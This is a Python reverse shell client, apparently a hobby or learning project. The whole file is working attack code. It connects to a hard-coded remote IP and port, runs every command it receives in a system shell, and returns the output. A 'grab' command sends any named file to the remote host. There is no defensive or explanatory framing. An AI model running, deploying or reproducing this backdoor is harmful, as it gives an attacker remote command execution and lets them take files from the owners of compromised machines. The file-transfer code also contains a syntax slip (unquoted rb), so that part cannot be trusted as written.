import socket
import subprocess
import os


def transfer(conn, path):
    try:
        fp = open(path, rb)
    except:
        conn.send('File not Found'.encode())
        return
    packet = fp.read(1024)
    while len(packet)>0:
        conn.send(packet)
        packet = fp.read(1024)
    conn.send('DONE'.encode())

def connect():
    # create socket object.
    s = socket.socket()
    # connect to ip and port of server.
    ip_address = '192.168.254.137'
    port_no = 8080
    s.connect((ip_address, port_no))
    # start accepting commands
    while True:
        cmd = s.recv(1024).decode()
        if 'exit'==cmd:
            s.close()
            break
        elif cmd=='' or cmd=='\n':
        	print('Skipped')
        	s.send('SKIP'.encode())
        elif cmd[0:4]=='grab':
            try:
                transfer(s, cmd[5:])
            except:
                pass
        else:
            output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            stop = output.stdout.read()
            ster = output.stderr.read()
            # print(stop)
            # print(ster)
            ans = b''
            if stop==b'':
            	# s.send('SKIP'.encode())
            	ans+='SKIP'.encode()
            else:
            	# s.send(stop)
            	ans+=stop
            ans+=ster
            s.send(ans)
            


def main():
    connect()


main()
